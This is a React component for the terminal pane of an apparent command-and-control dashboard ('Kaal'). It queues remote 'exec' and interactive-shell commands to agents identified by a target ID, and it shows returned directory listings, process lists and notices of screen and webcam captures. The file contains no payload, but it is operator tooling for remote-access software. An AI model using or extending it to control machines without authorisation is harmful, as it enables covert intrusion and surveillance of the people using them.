import React, { useEffect, useRef, useCallback, useState } from 'react';
import { Terminal } from 'xterm';
import { FitAddon } from 'xterm-addon-fit';
import 'xterm/css/xterm.css';
import { sendCommand } from '../../services/api';
import { Terminal as TerminalIcon, Maximize2, Trash2 } from 'lucide-react';
import { kaalEvents } from '../../services/eventBus';

/**
 * CommandShell – Persistent terminal that survives tab switches.
 *
 * Key change: useEffect dependency is [agentId] ONLY.
 * The `isInteractive` flag is tracked via a ref so we don't
 * recreate the terminal when toggling interactive mode.
 */
const CommandShell = ({ agentId }) => {
    const terminalRef = useRef(null);
    const term = useRef(null);
    const fitAddon = useRef(null);
    const commandBuffer = useRef('');
    const currentPath = useRef('~');
    const isInteractiveRef = useRef(false);

    // State for UI toggle button only — does NOT cause terminal recreation
    const [isInteractive, setIsInteractive] = useState(false);

    // Keep the ref in sync with state (for use inside callbacks)
    useEffect(() => {
        isInteractiveRef.current = isInteractive;
    }, [isInteractive]);

    useEffect(() => {
        if (!terminalRef.current) return;

        // Init Terminal ONCE
        term.current = new Terminal({
            theme: {
                background: '#0f0f23',
                foreground: '#cdd6f4',
                cursor: '#00ff9f',
                selection: 'rgba(0, 255, 159, 0.3)',
                black: '#1a1a2e',
                red: '#ff4757',
                green: '#2ed573',
                yellow: '#ffa502',
                blue: '#1e90ff',
                magenta: '#ff6b81',
                cyan: '#00d4ff',
                white: '#ffffff',
            },
            fontFamily: '"JetBrains Mono", "Fira Code", Consolas, monospace',
            fontSize: 14,
            cursorBlink: true,
            cursorStyle: 'underline',
            lineHeight: 1.2,
            allowTransparency: true,
            scrollback: 5000,
        });

        fitAddon.current = new FitAddon();
        term.current.loadAddon(fitAddon.current);
        term.current.open(terminalRef.current);
        fitAddon.current.fit();

        // Welcome Message
        term.current.writeln('\x1b[1;36m   __  __  ___    ___    __ \x1b[0m');
        term.current.writeln('\x1b[1;36m  / / / / / _ |  / _ |  / / \x1b[0m');
        term.current.writeln('\x1b[1;36m / /_/ / / __ | / __ | / /__\x1b[0m');
        term.current.writeln('\x1b[1;36m/_/___/ /_/ |_|/_/ |_|/____/\x1b[0m');
        term.current.writeln('');
        term.current.writeln('\x1b[1;32m[+] SECURE CONNECTION ESTABLISHED\x1b[0m');
        term.current.writeln(`\x1b[1;30mTarget ID: ${agentId}\x1b[0m`);
        term.current.writeln('');
        term.current.write(`\x1b[1;32mroot@kaal\x1b[0m:\x1b[1;34m${currentPath.current}\x1b[0m$ `);

        // Key Handler
        term.current.onKey(async (e) => {
            const char = e.key;
            const code = e.domEvent.keyCode;

            if (code === 13) { // Enter
                term.current.write('\r\n');
                const cmdToSend = commandBuffer.current.trim();

                if (cmdToSend) {
                    if (cmdToSend === 'clear') {
                        term.current.clear();
                        commandBuffer.current = '';
                    } else if (isInteractiveRef.current) {
                        await sendCommand(agentId, `shell_input ${cmdToSend}`);
                    } else {
                        await executeCommand(cmdToSend);
                    }
                } else if (isInteractiveRef.current) {
                    await sendCommand(agentId, `shell_input  `);
                }

                commandBuffer.current = '';
                const isCd = cmdToSend.startsWith('cd ');
                if (!isInteractiveRef.current && !isCd) {
                    term.current.write(`\x1b[1;32mroot@kaal\x1b[0m:\x1b[1;34m${currentPath.current}\x1b[0m$ `);
                }
            } else if (code === 8) { // Backspace
                if (commandBuffer.current.length > 0) {
                    commandBuffer.current = commandBuffer.current.slice(0, -1);
                    term.current.write('\b \b');
                }
            } else if (code >= 32 && code <= 126) {
                commandBuffer.current += char;
                term.current.write(char);
            }
        });

        const handleResize = () => {
            if (fitAddon.current) fitAddon.current.fit();
        };
        window.addEventListener('resize', handleResize);

        // Listen for task results
        const unsubscribeResult = kaalEvents.on('task_result', (data) => {
            if (data.agent_id !== agentId) return;
            if (isInteractiveRef.current) return;

            let output = "";

            try {
                const parsed = typeof data.result === 'string' ? JSON.parse(data.result) : data.result;

                if (parsed.type === "text" || parsed.type === "error") {
                    output = parsed.data.text || parsed.data || "";
                    if (typeof output === 'string') {
                        if (output.includes('~~KAAL_CWD~~')) {
                            output = output.replace(/~~KAAL_CWD~~[^\r\n]*~~END~~[\r\n]*/g, '');
                            const raw = parsed.data.text || '';
                            const match = raw.match(/~~KAAL_CWD~~(.+?)~~END~~/);
                            if (match) {
                                currentPath.current = match[1].trim();
                                if (term.current) {
                                    term.current.write(`\r\n\x1b[1;32mroot@kaal\x1b[0m:\x1b[1;34m${currentPath.current}\x1b[0m$ `);
                                }
                            }
                        }
                        if (output.startsWith('Changed to ')) {
                            currentPath.current = output.substring(11).trim();
                            if (term.current) {
                                term.current.write(`\r\n\x1b[1;32mroot@kaal\x1b[0m:\x1b[1;34m${currentPath.current}\x1b[0m$ `);
                            }
                        }
                    }
                } else if (parsed.type === "file_list") {
                    if (parsed.data && parsed.data.path) {
                        currentPath.current = parsed.data.path;
                        output = `Directory: ${parsed.data.path}\r\n`;
                        if (parsed.data.files) {
                            parsed.data.files.forEach(f => {
                                const size = f.is_dir ? "<DIR>" : f.size.toString().padStart(10);
                                const name = f.is_dir ? `\x1b[1;34m${f.name}\x1b[0m` : f.name;
                                output += `${size}  ${name}\r\n`;
                            });
                        }
                        if (term.current) {
                            term.current.write(`\r\n\x1b[1;32mroot@kaal\x1b[0m:\x1b[1;34m${currentPath.current}\x1b[0m$ `);
                        }
                    } else if (parsed.path) {
                        currentPath.current = parsed.path;
                        output = `Directory: ${parsed.path}\r\n`;
                        if (parsed.files) {
                            parsed.files.forEach(f => {
                                const size = f.is_dir ? "<DIR>" : f.size.toString().padStart(10);
                                const name = f.is_dir ? `\x1b[1;34m${f.name}\x1b[0m` : f.name;
                                output += `${size}  ${name}\r\n`;
                            });
                        }
                        if (term.current) {
                            term.current.write(`\r\n\x1b[1;32mroot@kaal\x1b[0m:\x1b[1;34m${currentPath.current}\x1b[0m$ `);
                        }
                    }
                } else if (parsed.type === "process_list") {
                    const procs = parsed.data && parsed.data.processes ? parsed.data.processes : parsed.processes;
                    if (procs) {
                        output = "PID     MEM      NAME\r\n";
                        output += "-----   -----    ----\r\n";
                        procs.forEach(p => {
                            output += `${p.pid.padEnd(8)} ${p.memory.padEnd(8)} ${p.name}\r\n`;
                        });
                    }
                } else if (parsed.type === "screenshot" || parsed.type === "screen" || parsed.type === "webcam") {
                    output = `\x1b[1;32m[✓ Capture Received: ${parsed.type}]\x1b[0m (See CAM/Files module)\r\n`;
                } else {
                    output = JSON.stringify(parsed, null, 2).replace(/\n/g, '\r\n');
                }
            } catch (e) {
                console.error("Shell JSON Parse Error!", e.message);
                output = typeof data.result === 'string' ? data.result : JSON.stringify(data.result);
            }

            if (typeof output === 'string' && output.startsWith("[SHELL]")) output = output.substring(8);

            if (typeof output === 'string' && term.current) {
                term.current.writeln(output.replace(/\n/g, '\r\n'));
            }
            const prompt = `\r\n\x1b[1;32mroot@kaal\x1b[0m:\x1b[1;34m${currentPath.current}\x1b[0m$ `;
            if (term.current) term.current.write(prompt);
        });

        // Listen for Shell Output (Interactive mode)
        const unsubscribeShell = kaalEvents.on('shell_output', (data) => {
            if (data.agent_id !== agentId) return;
            if (!isInteractiveRef.current) return;
            const out = data.output.replace(/\n/g, '\r\n');
            if (term.current) term.current.write(out);
        });

        return () => {
            if (term.current) term.current.dispose();
            window.removeEventListener('resize', handleResize);
            unsubscribeResult();
            unsubscribeShell();
        };
    }, [agentId]); // ← ONLY re-init when agent changes, NOT on interactive toggle

    const toggleInteractive = async () => {
        if (!isInteractiveRef.current) {
            if (term.current) term.current.writeln('\x1b[1;33m[*] Starting Interactive Shell Session...\x1b[0m');
            await sendCommand(agentId, 'shell_start');
            setIsInteractive(true);
        } else {
            if (term.current) term.current.writeln('\x1b[1;33m[*] Stopping Interactive Shell Session...\x1b[0m');
            await sendCommand(agentId, 'shell_stop');
            setIsInteractive(false);
            if (term.current) term.current.write(`\r\n\x1b[1;32mroot@kaal\x1b[0m:\x1b[1;34m${currentPath.current}\x1b[0m$ `);
        }
    };

    const clearQueue = async () => {
        try {
            const resp = await fetch(`/api/agent/${agentId}/clear_queue`, { method: 'POST' });
            const data = await resp.json();
            if (term.current) {
                term.current.writeln(`\r\n\x1b[1;33m[*] Cleared ${data.cleared || 0} queued task(s)\x1b[0m`);
                term.current.write(`\x1b[1;32mroot@kaal\x1b[0m:\x1b[1;34m${currentPath.current}\x1b[0m$ `);
            }
        } catch (e) {
            if (term.current) term.current.writeln(`\r\n\x1b[31m[ERROR] Failed to clear queue: ${e.message}\x1b[0m`);
        }
    };

    const executeCommand = async (cmd) => {
        try {
            const result = await sendCommand(agentId, `exec ${cmd}`);
            if (result.data && result.data.task && term.current) {
                term.current.writeln(`\x1b[90m[Task Queued: ${result.data.task}]\x1b[0m`);
            }
        } catch (error) {
            if (term.current) term.current.writeln(`\x1b[31m[ERROR] ${error.message}\x1b[0m`);
        }
    };

    return (
        <div className="h-full flex flex-col bg-[#0f0f23]">
            {/* Terminal Header */}
            <div className="flex items-center justify-between px-4 py-2 bg-[#1a1a2e] border-b border-[#2d2d44]">
                <div className="flex items-center space-x-2 text-xs font-mono text-gray-400">
                    <TerminalIcon className="w-4 h-4 text-accent-primary" />
                    <span>/bin/bash - 80x24</span>
                </div>
                <div className="flex space-x-2">
                    <button
                        onClick={toggleInteractive}
                        className={`px-2 py-0.5 text-xs font-mono rounded border transition-colors ${isInteractive
                            ? 'bg-green-500/20 text-green-400 border-green-500/50 hover:bg-green-500/30'
                            : 'bg-gray-800 text-gray-400 border-gray-700 hover:text-white'
                            }`}
                        title="Toggle Interactive Shell">
                        {isInteractive ? 'LIVE SHELL' : 'INTERACTIVE'}
                    </button>
                    <button
                        onClick={clearQueue}
                        className="px-2 py-0.5 text-xs font-mono rounded border border-red-500/50 text-red-400 bg-red-500/10 hover:bg-red-500/20 transition-colors"
                        title="Clear Pending Commands">
                        CLEAR Q
                    </button>
                    <button
                        onClick={() => term.current && term.current.clear()}
                        className="p-1 hover:text-white text-gray-500 transition-colors" title="Clear Screen">
                        <Trash2 className="w-4 h-4" />
                    </button>
                    <button className="p-1 hover:text-white text-gray-500 transition-colors" title="Maximize">
                        <Maximize2 className="w-4 h-4" />
                    </button>
                </div>
            </div>

            {/* Terminal Container */}
            <div className="flex-1 relative group">
                <div className="absolute inset-0 bg-accent-primary/5 opacity-0 group-hover:opacity-100 transition-opacity pointer-events-none"></div>
                <div
                    ref={terminalRef}
                    className="absolute inset-0 p-4 overflow-hidden"
                />
            </div>
        </div>
    );
};

export default CommandShell;
